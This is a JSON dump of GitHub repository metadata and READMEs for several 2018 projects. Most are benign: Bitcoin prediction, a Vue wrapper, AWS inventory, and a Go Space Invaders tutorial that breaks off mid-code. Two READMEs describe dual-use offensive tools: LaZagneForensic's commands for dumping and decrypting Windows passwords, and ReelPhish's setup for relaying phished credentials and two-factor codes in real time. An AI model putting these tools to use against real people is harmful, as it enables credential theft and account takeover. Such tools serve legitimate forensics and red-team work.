{"user":{"login":"llSourcell","followers":{"totalCount":13274},"repositories":{"totalCount":258},"following":{"totalCount":4},"location":"San Francisco, CA","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":31},"websiteUrl":"www.youtube.com/c/sirajraval"},"repository":{"name":"bitcoin_prediction","primaryLanguage":{"name":"Jupyter Notebook"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":69,"readme_md":{"text":"# Overview\n\nThis is the code for [this](https://youtu.be/EqWm8A-dRYg) video on Youtube by Siraj Raval on Bitcoin Prediction. \n\n##### Usage #####\nThe entire setup works on Google cloud.\n\n##### Part 1: Data Gathering: #####\nIn order to capture the real-time data, we run the following two python programs in background to continuously fetch the data. \na) Continuous_Stream_Data.py \nb) Continuous_Stream_Sentiment.py\n\nThe two code do the preprocessing of data and store them in “live_tweet.csv” and “live_bitcoin.csv” files.\n\n##### Part 2: Core Engine: #####\nFrom the experiments we found LSTM based model to be performing better than ARIMA (discussed in detail in next section). We have set our best model parameters in engine.py file and once it is run it gathers data from the “live_bitcoin.csv” and “live_tweet.csv”, and generate features in real-time and is fed into the model.\n\nThe model outputs the next price. It also does a computation based on the threshold set in the code (this is fed from the settings file). \n\nThe information about the time stamp, predicted price, current real price and buy/sell decision is then written into a mysql database\n\n##### Part 3: Tableau and Notification system: #####\n\nWe have used Tableau to generate plots in real-time form the sql-database mentioned in previous section. \n\n\n\n# Credits\n\nCredits for this code go to [sapphirine](https://github.com/Sapphirine/BITCOIN-PRICE-PREDICTION-USING-SENTIMENT-ANALYSIS). I've merely created a wrapper to get people started. \n","byteSize":1523},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":146},"createdAt":"2018-02-01T10:02:10Z","updatedAt":"2018-02-16T13:48:35Z","pushedAt":"2018-02-01T10:31:53Z","description":"This is the code for \"Bitcoin Prediction\" by Siraj Raval on Youtube ","subscribersCount":{"totalCount":9},"diskUsage":1040,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":8},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":7},"participants":{"totalCount":5}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":3}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"organization":{"login":"vuejs","repositories":{"totalCount":79},"location":"All Over the World","members":{"totalCount":27},"websiteUrl":"https://vuejs.org"},"repository":{"name":"vue-web-component-wrapper","primaryLanguage":{"name":"JavaScript"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":11,"readme_md":{"text":"# @vue/web-component-wrapper [![CircleCI](https://circleci.com/gh/vuejs/vue-web-component-wrapper.svg?style=shield)](https://circleci.com/gh/vuejs/vue-web-component-wrapper)\n\n> Wrap and register a Vue component as a custom element.\n\n## Compatibility\n\n**[Requires ES2015 classes](https://caniuse.com/es6-class). IE11 and below not supported.**\n\n- **If targeting browsers that natively support ES2015, but not native Web Components:**\n\n  You will also need the [Shady DOM + Custom Elements polyfill](https://github.com/webcomponents/webcomponentsjs/blob/master/webcomponents-sd-ce.js).\n\n  See caniuse.com for support on [Custom Elements v1](https://caniuse.com/#feat=custom-elementsv1) and [Shadow DOM v1](https://caniuse.com/#feat=shadowdomv1).\n\n- **Note on CSS Encapsulation When Using the Shady DOM polyfill**\n\n  It's recommended to use [CSS Modules](https://vue-loader.vuejs.org/en/features/css-modules.html) instead of `<style scoped>` in your `*.vue` files if you intend to use the Shady DOM polyfill, because it does not offer real style encapsulation like Shadow DOM does, so external stylesheets may affect your components if not using hashed class names.\n\n- **If targeting browsers that does not support ES2015:**\n\n  You might want to reconsider since you'll be better off not using Web Components in this case.\n\n## Usage\n\n- **`dist/vue-wc-wrapper.js`**: This file is in ES modules format. It's the default export for bundlers, and can be used in browsers with `<script type=\"module\">`.\n\n- **`dist/vue-wc-wrapper.global.js`**: This is for old school `<script>` includes in browsers that do not support `<script type=\"module\">` yet (exposes `wrapVueWebComponent` global).\n\n``` js\nimport Vue from 'vue'\nimport wrap from '@vue/web-component-wrapper'\n\nconst Component = {\n  // any component options\n}\n\nconst CustomElement = wrap(Vue, Component)\n\nwindow.customElements.define('my-element', CustomElement)\n```\n\nIt works with async components as well - you can pass an async component factory function that returns a Promise, and the function will only be called when an instance of the custom element is created on the page:\n\n``` js\nconst CustomElement = wrap(Vue, () => import(`MyComponent.vue`))\n\nwindow.customElements.define('my-element', CustomElement)\n```\n\n## Interface Proxying Details\n\n### Props\n\n- All `props` declared in the Vue component are exposed on the custom element as its properties. Kebab-case props are converted to camelCase properties, similar to how they are converted in Vue.\n\n- Setting properties on the custom element updates the props passed to the inner Vue component.\n\n- Setting attributes on the custom element updates corresponding declared props. Attributes are mapped to kebab-case. For example, a prop named `someProp` will have a corresponding attribute named `some-prop`.\n\n- Attributes that map to props declared with `type: Boolean` are auto-casted into boolean values in the following rules:\n\n  - `\"\"` or same value as attribute name: -> `true`\n\n  - `\"true\"` -> `true`\n\n  - `\"false\"` -> `false`\n\n- Attributes that map to props declared with `type: Number` are auto-casted into numbers if the value is a parsable number.\n\n### Events\n\nCustom events emitted on the inner Vue component are dispatched on the custom element as a `CustomEvent`. Additional arguments passed to `$emit` will be exposed as an Array as `event.detail`.\n\n### Slots\n\nSlots work the same way as expected, including named slots. They also update when changed (using `MutationObserver`).\n\nScoped slots however, are not supported as they are a Vue specific concept.\n\n### Lifecycle\n\nWhen the custom element is removed from the document, the Vue component behaves just as if it's inside a `<keep-alive>` and its `deactivated` hook will be called. When it's inserted again, the `activated` hook will be called.\n\nIf you wish to destroy the inner component, you'd have to do that explicitly:\n\n``` js\nmyElement.vueComponent.$destroy()\n```\n\n## Acknowledgments\n\nSpecial thanks to the prior work by @karol-f in [vue-custom-element](https://github.com/karol-f/vue-custom-element).\n\n## License\n\nMIT\n","byteSize":4093},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":175},"createdAt":"2018-02-01T23:06:39Z","updatedAt":"2018-02-16T23:28:05Z","pushedAt":"2018-02-03T19:57:53Z","description":"Wrap a Vue component as a web component / custom element.","subscribersCount":{"totalCount":11},"diskUsage":71,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":2},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":24}}},"tags":{"totalCount":2},"releases":{"totalCount":0},"type":"organization"},"siteAdmin":"false"},{"organization":{"login":"devops-israel","repositories":{"totalCount":39},"location":"Israel","members":{"totalCount":1},"websiteUrl":"http://www.devops.co.il/"},"repository":{"name":"aws-inventory","primaryLanguage":{"name":"HTML"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":20,"readme_md":{"text":"# AWS Inventory\n\nA single-file that shows the whole inventory of your AWS services on a single page.\n\n## Usage\n\n* Clone or copy the `index.html` file to your computer\n* Open the `index.html` file in your browser\n\n## How it looks\n\n![screenshot](/example-screenshot.png?raw=true \"Example AWS Inventory\")\n\n## How it works\n\nThe AWS Inventory is using the AWS JavaScript SDK and a sprinkle of Bootstrap,\nthis allows to show results in pretty tables from any AWS API.\n\nThe syntax to describe table headers and a pointer to the relevant array in the\nresults is using JMESPath syntax (jmespath.org).\n\nExample of the EC2 listing:\n\n    { service: \"EC2\",\n      api: \"describeInstances\",\n      title: \"EC2 Instances\",\n      id: \"ec2-instances\",\n      jmespath: \"Reservations[].Instances\",\n      headings: [\"InstanceId\", \"InstanceType\", \"ImageId\", \"LaunchTime\", \"KeyName\", \"State.Name\"]\n    }\n\nThis specifies that it should use the `AWS.EC2()` APIs, and call the\n`describeInstances` method. Then create HTML elements that include the `id`\n`ec2-instances` and a button with the title `EC2 Instances`.\n\nThe returned results, as documented in callback section for `describeInstances`\nin the official documentation, are searched for `Reservations[].Instances` for\nan array of relevant data to be put into a table.\n\nhttps://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/EC2.html#describeInstances-property\n\nThe table will include the headers described in `headings`, which also use\nJMESPath, like in the example for `State.Name` so that nested elements can be\nreferences.\n\n## Notes\n\nThe AWS JavaScript SDK does not support all the AWS services when used in a\nbrowser, because not all services have CORS enabled.\n\nThe list of CORS supported services is available at\nhttps://github.com/aws/aws-sdk-js/blob/master/SERVICES.md\n\n## Contributing\n\nWe follow the \"fork-and-pull\" Git workflow.\n\n* Fork the repo on GitHub\n* Clone the project to your own machine\n* Commit changes to your own branch\n* Push your work back up to your fork\n* Submit a Pull request so that we can review your changes and merge\n\n## Copyright and Licensing\n\nMIT License, as described in the `LICENSE` file\n\nCopyright 2018 &copy; Devops Israel, Evgeny Zislis and contributors\n","byteSize":2225},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":180},"createdAt":"2018-02-01T12:50:33Z","updatedAt":"2018-02-16T07:13:00Z","pushedAt":"2018-02-11T13:38:35Z","description":"AWS Inventory in a single HTML file using JS AWS-SDK & Bootstrap","subscribersCount":{"totalCount":11},"diskUsage":123,"pullRequestsOpen":{"totalCount":1},"pullRequestsClosed":{"totalCount":1},"pullRequestsMerged":{"totalCount":5},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":11}}}]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":5},"commits":{"totalCount":2}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}}]},"issuesOpen":{"totalCount":4},"issuesClosed":{"totalCount":3},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":39}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"organization"},"siteAdmin":"false"},{"user":{"login":"AlessandroZ","followers":{"totalCount":414},"repositories":{"totalCount":9},"following":{"totalCount":4},"location":null,"organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":""},"repository":{"name":"LaZagneForensic","primaryLanguage":{"name":"Python"},"license":"GNU Lesser General Public License v3.0","isArchived":false,"hasWikiEnabled":true,"forkCount":38,"readme_md":{"text":"\n__The LaZagne Project !!!__ \n==\n\nDescription\n----\nThe __LaZagne project__ is back !!! \n\n[LaZagne](https://github.com/AlessandroZ/LaZagne) uses an internal Windows function called *CryptUnprotectData* to decrypt user passwords. This API should be called on the victim user session, otherwise, it does not work. If the computer has not been started (when the analysis is realized on an offline mounted disk), or if we do not want to drop a binary on the remote host, no passwords can be retrieved. \n\n[LaZagneForensic](https://github.com/AlessandroZ/LaZagneForensic) has been created to avoid this problem. This work has been mainly inspired by the awesome work done by *Jean-Michel Picod* for [DPAPICK](https://bitbucket.org/jmichel/dpapick) and *Francesco Picasso* for [Windows DPAPI laboratory](https://github.com/dfirfpi/dpapilab). \n\n__Note__: The main problem is that to decrypt these passwords, the user Windows passwords is needed. \n\nInstallation\n----\n```\npip install -r requirements.txt\n```\n\nUsage\n----\n\n### First way - Dump configuration files from the remote host\n* Using the powershell [script](https://github.com/AlessandroZ/LaZagneForensic/blob/master/dump/dump.ps1)\n```\nPS C:\\Users\\test\\Desktop> Import-Module .\\dump.ps1\nPS C:\\Users\\test\\Desktop> Dump\nFolder dump created successfully !\n```\n* Using the python [script](https://github.com/AlessandroZ/LaZagneForensic/blob/master/dump/dump.py)\n```\npython dump.py\n```\n* Launch Lazagne with password if you have it\n```\npython laZagneForensic.py all -remote /tmp/dump -password 'ZapataVive'\n```\n* Launch Lazagne without password \n```\npython laZagneForensic.py all -remote /tmp/dump\n```\n\n### Second way - Mount a disk on your filesystem\n* The file should be mounted on your filesystem\n```\ntest:~$ ls /tmp/disk/\ntotal 769M\ndrwxr-xr-x 2 root root    0 févr.  1 14:05 ProgramData\n-rwxr-xr-x 1 root root 256M févr.  1 14:05 swapfile.sys\n-rwxr-xr-x 1 root root 512M févr.  1 14:05 pagefile.sys\ndrwxr-xr-x 2 root root    0 janv. 31 00:35 System Volume Information\ndr-xr-xr-x 2 root root    0 janv. 26 10:17 Program Files (x86)\ndr-xr-xr-x 2 root root    0 janv. 25 18:13 Program Files\ndrwxr-xr-x 2 root root    0 janv. 19 10:09 Windows\ndrwxr-xr-x 2 root root    0 janv. 16 15:52 Homeware\ndrwxr-xr-x 2 root root    0 janv.  9 17:33 PerfLogs\ndrwxr-xr-x 2 root root    0 nov.  22 20:37 Recovery\ndrwxr-xr-x 2 root root 4,0K nov.  22 20:31 Documents and Settings\ndr-xr-xr-x 2 root root    0 nov.  22 20:31 Users\n```\n* Launch Lazagne with password if you have it\n```\npython laZagneForensic.py all -local /tmp/disk -password 'ZapataVive'\n```\n* Launch Lazagne without password \n```\npython laZagneForensic.py all -local /tmp/disk\n```\n__Note__: Use __-v__ for verbose mode and __-vv__ for debug mode.\n\nSupported software\n----\n__Note__: Check the following image to understand which passwords you could decrypt without needed the user windows password. All credentials found will be tested as Windows password in case of the user re-uses the same password. \n\n<p align=\"center\"><img src=\"./pictures/softwares.png\" alt=\"The LaZagne project\"></p>\n\nDonation\n----\nDo not hesitate to support my work doing a donation, I will appreciate a lot:\n* Via BTC: 16zJ9wTXU4f1qfMLiWvdY3woUHtEBxyriu\n\nSpecial thanks\n----\n* Jean-Michel Picod for [DPAPICK](https://bitbucket.org/jmichel/dpapick)\n* Francesco Picasso for [Windows DPAPI laboratory](https://github.com/dfirfpi/dpapilab)\n* Jean-Christophe Delaunay - Jiss/Fist0urs from the Synacktiv team for their [work](https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf)\n\nRecommended articles related to DPAPI\n----\n* [Happy DPAPI!](http://blog.digital-forensics.it/2015/01/happy-dpapi.html)\n* [ReVaulting! Decryption and opportunities](https://www.slideshare.net/realitynet/revaulting-decryption-and-opportunities)\n* [Windows ReVaulting](http://blog.digital-forensics.it/2016/01/windows-revaulting.html)\n* [DPAPI exploitation during pentest and password cracking](https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf)\n\n----\n| __Alessandro ZANNI__    |\n| ------------- |\n| __zanni.alessandro@gmail.com__  |\n\n","byteSize":4102},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":186},"createdAt":"2018-02-01T15:44:31Z","updatedAt":"2018-02-16T21:20:11Z","pushedAt":"2018-02-16T15:16:45Z","description":"Windows passwords decryption from dump files","subscribersCount":{"totalCount":18},"diskUsage":228,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":9}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"organization":{"login":"fireeye","repositories":{"totalCount":35},"location":"Milpitas, CA","members":{"totalCount":0},"websiteUrl":"http://blog.fireeye.com"},"repository":{"name":"ReelPhish","primaryLanguage":{"name":"Python"},"license":"GNU General Public License v3.0","isArchived":false,"hasWikiEnabled":true,"forkCount":32,"readme_md":{"text":"### Instructions for ReelPhish:\n\nThis tool has been released along with a FireEye blog post. The blog post can be found at the following link: https://www.fireeye.com/blog/threat-research/2018/02/reelphish-real-time-two-factor-phishing-tool.html\n\n#### Installation Steps\n\n1. The latest release of Python 2.7.x is required.\n\n2. Install Selenium, a required dependency to run the browser drivers.\n\n    * pip install -r requirements.txt\n    \n3. Download browser drivers for all web browsers you plan to use. Binaries\nshould be placed in this root directory with the following naming scheme.\n    \n    * Internet Explorer: www.seleniumhq.org/download/\n        * Download the Internet Explorer Driver Server for 32 bit Windows IE. Unzip the\n        file and rename the binary to: **IEDriver.exe**.\n        * In order for the Internet Explorer Driver to work, be sure protected mode is disabled. On IE11 (64 bit Windows), you must\n        create registry key \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_BFCACHE\".\n        In this key, create a DWORD value named _iexplore.exe_ and set the value to 0.\n        * Further information on Internet Explorer requirements can be found on www.github.com/SeleniumHQ/selenium/wiki/InternetExplorerDriver\n    \n    * Firefox: www.github.com/mozilla/geckodriver/releases/\n        * Download the latest release of the Firefox GeckoDriver for Windows 32 bit. Unzip the file and\n        rename the binary to: **FFDriver.exe**.\n            * On Linux systems, download the Linux version of Firefox GeckoDriver and rename the binary to: **FFDriver.bin** . Linux support\n            is experimental.\n        * Gecko Driver has special requirements. Copy FFDriver.exe to **geckodriver.exe** and place it\n        into your PATH variable. Additionally, add **firefox.exe** to your PATH variable.\n    \n    * Chrome: https://chromedriver.storage.googleapis.com/index.html?path=2.35/\n        * Download the latest release of the Google Chrome Driver for Windows 32 bit. Unzip the file and\n        rename the binary to: **ChromeDriver.exe**.\n            * On Linux systems, download the Linux version of the Chrome Web Driver and rename the binary to: **ChromeDriver.bin** . Linux support is\n            experimental.\n\n#### Running ReelPhish\n\nReelPhish consists of two components: the phishing site handling code and this script. The phishing site\ncan be designed as desired. Sample PHP code is provided in /examplesitecode. The sample code will take a\nusername and password from a HTTP POST request and transmit it to the phishing script.\n\nThe phishing script listens on a local port and awaits a packet of credentials. Once credentials are received,\nthe phishing script will open a new web browser instance and navigate to the desired URL (the actual site where you\nwill be entering a user's credentials).  Credentials will be submitted by the web browser.\n\nThe recommended way of handling communication between the phishing site and this script is by using a reverse\nSSH tunnel. This is why the example PHP phishing site code submits credentials to **localhost:2135**.\n\n##### ReelPhish Arguments\n\n1. You must specify the browser you will be using with the --browser parameter. Supported browsers include Internet\nExplorer (\"--browser IE\"), Firefox (\"--browser FF\"), and Chrome (\"--browser Chrome\"). Windows and Linux are both supported. Chrome requires the least amount of setup steps. See\nabove installation instructions for further details.\n2. You must specify the URL. The script will navigate to this URL and submit credentials on your behalf.\n3. Other optional parameters are available.\n    * Set the logging parameter to debug (--logging debug) for verbose event logging\n    * Set the submit parameter (--submit) to customize the element that is \"clicked\" by the browser\n    * Set the override parameter (--override) to ignore missing form elements\n    * Set the numpages parameter (--numpages) to increase the number of authentication pages (see below section)\n\n##### Multi Page Authentication Support\n\nReelPhish supports multiple authentication pages. For example, in some cases a two factor authentication code may be\nrequested on a second page. To implement this feature, be sure that --numpages is set to the number of authentication pages.\nAlso be sure that the session ID is properly tracked on your phishing site. The session ID is used to track users as they\nproceed through each step of authentication. \n\nIn some cases, you may need to scrape specific content (such as a challenge code) off of a particular authentication page. \nExample commented out code is provided in ReelPhish.py to perform a scraping operation. \n","byteSize":4706},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":208},"createdAt":"2018-02-01T20:35:11Z","updatedAt":"2018-02-17T04:08:07Z","pushedAt":"2018-02-07T16:50:47Z","description":null,"subscribersCount":{"totalCount":20},"diskUsage":23,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":5}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"organization"},"siteAdmin":"false"},{"user":{"login":"aguinet","followers":{"totalCount":150},"repositories":{"totalCount":39},"following":{"totalCount":6},"location":null,"organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}}],"totalCount":5},"websiteUrl":"https://twitter.com/adriengnt"},"repository":{"name":"dragonffi","primaryLanguage":{"name":"C++"},"license":"Apache License 2.0","isArchived":false,"hasWikiEnabled":true,"forkCount":8,"readme_md":null,"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":234},"createdAt":"2018-02-01T23:23:54Z","updatedAt":"2018-02-17T01:08:05Z","pushedAt":"2018-02-11T19:43:19Z","description":"C Foreign Function Interface and JIT using Clang/LLVM","subscribersCount":{"totalCount":14},"diskUsage":300,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":1},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":2},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":27}}},"tags":{"totalCount":3},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"sausheong","followers":{"totalCount":508},"repositories":{"totalCount":89},"following":{"totalCount":1},"location":"Singapore","organizations":{"totalCount":1},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":11},"websiteUrl":"http://blog.saush.com"},"repository":{"name":"invaders","primaryLanguage":{"name":"Go"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":37,"readme_md":{"text":"# Writing Space Invaders with Go\n\nThe earliest memory I had of arcade video games was watching my older brother and cousins going at the video game machines at Genting Highlands. While our parents were at the other types of games Genting Highlands was more popularly known for, we were generally let loose to play arcade games to our hearts' content. \n\nThose were the magical days of Pac-Man, Space Invaders, Galaxian, Donkey Kong, Frogger, Centipede and many, many more. Days of blinking lights, intense music, frantic tugs at the joystick, furious mashing of the buttons then the groans of dismay as the last life was lost. \n\nAs with many aspiring programmers starting out, one of my secret dreams was always to recreate that magic, to write the next big game. And as with many as well programmers, I failed many times miserably. Even though eventually I succeeded in writing some simple games, I came to realise that even seemingly simple games are in fact not easy to write.\n\nOf course that didn't stop me from trying my hand at it once again. This time round I tried the grand old dame of arcade video games -- _Space Invaders_.\n\n## Space Invaders\n\n[Space Invaders](https://en.wikipedia.org/wiki/Space_Invaders) was one of the most successful arcade video games during the [golden age of arcade video games](https://en.wikipedia.org/wiki/Golden_age_of_arcade_video_games). It was first released in 1978 and is generally accepted as start of the golden age, which lasted from late 70s to the early 90s. Even after the decline of arcade video games, it simply transcended the medium and moved to video game consoles.\n\n![Space Invaders](images/space-invaders.png)\n\nThe premise of the game, in case you're not already familiar, is quite simple. As the player you control a laser cannon to battle rows of alien invaders. The laser cannon can only move horizontally across the bottom of the screen as the aliens move back and forth, and slowly descending upon you. The aliens try to destroy you by dropping torpedos at you, while you are partially protected by a few stationary defending bunkers. The game ends if the aliens reach the cannon or all your cannons are destroyed.\n\nAs I said, simple. \n\n## Engine-less\n\nMost game development uses some sort of game engine or at least a graphics engine, but the game I wrote uses neither. Instead what I tried to do is to build a game by creating individual frames and displaying them rapidly one after another. Essentially, this is a variation of the [flocking simulation](https://sausheong.github.io/posts/flocking-with-go/) I wrote earlier. \n\nThe idea is quite straightforward -- a while back I stumbled on a [hack](https://www.iterm2.com/documentation-images.html) in iTerm2 that allows me to display images on the screen and that led me, one thing to another, displaying a number of images one after another, resulting in an animation.\n\nWhich, if you think about it, is what a simple game like Space Invaders is all about -- an animation that can be controlled by a user.\n\nLet's look at the code.\n\n## Sprites\n\nIn computer graphics, sprites are independent objects that are added on to a background. Sprites were, not unexpectedly, first used in arcade video games and were often generated by hardware. In our case, we're using a simple but popular technique of using a single sprite sheet and taking various parts of the sprite sheet to be a separate sprite.\n\n![sprites](/images/sprites.png)\n\nThe image above is a magnified version of the `sprites.png` sprite sheet file. \n\n```go\n// sprites\nvar src = getImage(\"imgs/sprites.png\")\nvar background = getImage(\"imgs/bg.png\")\nvar cannonSprite = image.Rect(20, 47, 38, 59)\nvar cannonExplode = image.Rect(0, 47, 16, 57)\nvar 